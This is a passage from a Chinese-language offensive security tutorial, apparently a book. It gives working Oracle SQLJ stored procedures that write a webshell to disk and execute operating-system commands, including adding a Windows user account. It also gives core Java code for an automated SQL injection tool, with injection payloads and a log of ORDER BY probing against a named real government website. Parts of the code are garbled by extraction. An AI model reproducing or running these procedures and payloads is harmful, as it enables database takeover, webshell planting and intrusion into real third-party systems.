旦Java源程序被编译，Java执行程序就可在任何数据库上运行。 
SQLJ运行环境由纯Java实现的小SQLJ运行库（小，意指其中包括少量的代码）组成，
该运行时库转而调用相应数据库的JDBC驱动程序。  
SQLJ可以这样玩：首先创建一个类提供一个静态方法： 
其中的getShell是我们的方法名，p和才是参数，p是路径，而c是要写的文件内容。
在创建Java存储过程的时候方法类型必须是静态的static 
执行以下SQL创建Java储存过程： 
create or replace and compile 
java source named "getShell" 
as public class GetShell {public static int getShell(String p, String c) 
{int RC = -1;try {new java.io.FileOutputStream(p).write(c.getBytes());RC 
= 1;} catch (Exception e) {e.printStackTrace();}return RC;}} 
创建函数： 
create or replace 
function getShell(p in varchar2, c in varchar2) return number 
as 
language java 
name 'util.getShell(java.lang.String, java.lang.String) return 
第 78 页 
Integer'; 
创建存储过程： 
create or replace procedure RC(p in varChar, c in varChar) 
as 
x number; 
begin 
x := getShell(p,c); 
end; 
授予Java权限： 
variable x number; 
set serveroutput on; 
exec dbms_java.set_output(100000); 
grant javasyspriv to system; 
grant javauserpriv to system; 
写webshell： 
exec :x:=getShell('d:/3.txt','selina'); 
第 79 页 
SQLJ执行cmd命令： 
方法这里和上面几乎大同小异，一样的提供一个静态方法，然后去创建一个存储过程。
然后调用Java里的方法去执行命令。 
创建Java存储过程: 
create or replace and compile java source named "Execute" as    
import java.io.BufferedReader; 
import java.io.InputStreamReader; 
public class Execute { 
public static void executeCmd(String c) { 
try { 
String l="",t; 
BufferedReader br = new BufferedReader(new 
第 80 页 
InputStreamReader(java.lang.Runtime.getRuntime().exec(c).getInputStre
am(),"gbk")); 
while((t=br.readLine())!=null){ 
l+=t+"\n"; 
} 
System.out.println(l); 
} catch (Exception e) { 
e.printStackTrace(); 
} 
} 
} 
/ 
2、创建存储过程executeCmd： 
create or replace procedure executeCmd(c in varchar2) 
as 
language java name 'Execute.executeCmd(java.lang.String)'; 
/ 
执行存储过程： 
exec executeCmd('net user selina 123 /add'); 
第 81 页 
 上面提供的命令执行和getshell创建方式对换一下就能回显了，如果好不清楚怎么让命令
执行后回显可以参考：
http://hi.baidu.com/xpy_home/item/09cbd9f3fd30ef0585d27833 
。  
一个不错的SQLJ的demo（犀利的 oracle 注入技术）。
http://huaidan.org/archives/2437.html 
2、自动化的 SQL 注入工具实现 
通过上面我们对数据库和 SQL 注入的熟悉，现在可以自行动手开发注入工具了吧？ 
很久以前非常粗糙的写了一个 SQL 注入工具类，就当作 demo 给大家做个演示了，仅提供核
心代码，案例中的 gov 网站请勿非常攻击！ 
简单的 SQL Oder by 注入实现的方式核心代码： 
1、分析URLpublic static void AnalysisUrls(String site) throws Exception 
这个方法主要是去分析URL的组成是否静态化等。 
2、检测是否存在： 
这个做的粗糙了些，只是通过请求提交不同的SQL注入语句去检测页面返回的情况： 
/** 
 * 分析SQL参数是否存在注入 
 * @param str 
 */ 
public static void  AnalysisUrlDynamicParamSqlInjection(String 
str[]) { 
Map content,content2; 
sqlKey = new ArrayList(); 
content = 
HttpHelper.sendGet(protocol+"://"+schema+":"+port+"/"+filesIndex+"/"+
file,parameter);//原始的请求包 
int len1 = content.get("content").toString().length();//原始请求
的response长度 
boolean typeIsNumber = false; 
String c1[] = 
{"'","-1",")\"\"\"\"\"()()",")+ANd+3815=3835+ANd+(1471=1471",") 
ANd+9056=9056+ANd+(9889=9889"," ANd+6346=6138 "," ANd+9056=9056"};//需
要检查的对象 
for (int i = 0; i  sb = 
HttpHelper.sendGet(protocol+"://"+schema+":"+port+"/"+filesIndex+"/"+
file,parameter);//原始的请求包 
int len1 = sb.get("content").toString().length();//原始请求的
response长度 
int count = -1; 
for (Object o : sqlKey) { 
count = getSbCount(o.toString(), len1);//计算字段 
第 83 页 
} 
return count; 
} 
/** 
 *获取order by 字段数 
 * @param key 
 * @param len1 
 * @return 
 */ 
public static int getSbCount(String key,int len1){ 
System.out.println("-----------------------end:"+end+"-----------
------------------"); 
Map sb = HttpHelper.sendGet(uri, 
parameter.replace(key, key+"+orDer+By+"+end+"+%23")); 
if (1 == end|| 
len1==((String)sb.get("content")).length()&&200==(Integer)sb.get("sta
tus")) { 
System.out.println("index:"+end); 
start = end; 
for (int i = start; i  sb2 = HttpHelper.sendGet(uri, 
parameter.replace(key, key+"+orDer+By+"+end+"+%23")); 
Map sb3 = HttpHelper.sendGet(uri, 
parameter.replace(key, key+"+orDer+By+"+(end+1)+"+%23")); 
if 
(((String)sb3.get("content")).length()!=((String)sb2.get("content")).
length()&&200==(Integer)sb2.get("status")) { 
System.out.println("order by 字段数为:"+end); 
sbCount = end;//设置字段长度为当前检测出来的长度 
return index = end; 
}else { 
end++; 
} 
} 
}else { 
end = end/2; 
getSbCount(key, len1); 
} 
return index; 
} 
第 84 页 
利用检测是否存在SQL注入的原理同样能过检测出查询的字段数。我们通过二分去
order一个by 一个数然后去请求分析页面一致性。然后不停的去修改数值最终结果相等
即可获得字段数。上面的分析的代码挺简单的，有兴趣的同学自己去看。日志如下： 
************开始精确匹配***************** 
url:http://www.tchjbh.gov.cn/news_display.php 
param:id=148+orDer+By+15+%23 
url:http://www.tchjbh.gov.cn/news_display.php 
param:id=148+orDer+By+16+%23 
************开始精确匹配***************** 